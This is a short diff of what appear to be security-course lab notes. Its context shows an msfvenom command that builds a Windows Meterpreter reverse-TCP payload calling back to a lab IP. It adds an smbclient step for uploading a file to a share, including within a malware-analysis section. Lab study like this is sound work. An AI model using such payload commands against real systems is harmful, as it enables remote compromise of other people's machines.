@@ -300,7 +300,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f e
 		• -f exe: Output format is a Windows executable.
 -o reverse.exe: Saves the payload as reverse.exe
 
-
+move file to another machine 
 sudo apt install smbclient
 smbclient //10.10.1.11/Share -U user
 put movie.mp4
@@ -1133,6 +1133,11 @@ You are assigned to monitor a suspicious process running in a machine whose log 
 - Install procmon.exe in the malware analysis folder
 - open that file in procmon
 - Search H3II0 and double click to open. now you find the Paren PID
+
+move file to another machine 
+sudo apt install smbclient
+smbclient //10.10.1.11/Share -U user
+put movie.mp4
 
 
 
